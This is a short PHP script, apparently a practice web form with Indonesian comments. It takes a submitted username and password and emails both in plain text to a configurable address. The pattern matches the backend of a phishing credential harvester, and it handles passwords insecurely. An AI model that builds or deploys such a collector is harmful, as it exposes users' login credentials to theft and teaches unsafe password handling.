<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    $to = "emailkamu@gmail.com"; // ganti ke emailmu
    $subject = "Form Latihan Web";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: latihan@domain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "✅ Data berhasil terkirim ke emailmu.";
    } else {
        echo "❌ Gagal mengirim.";
    }
}
?>
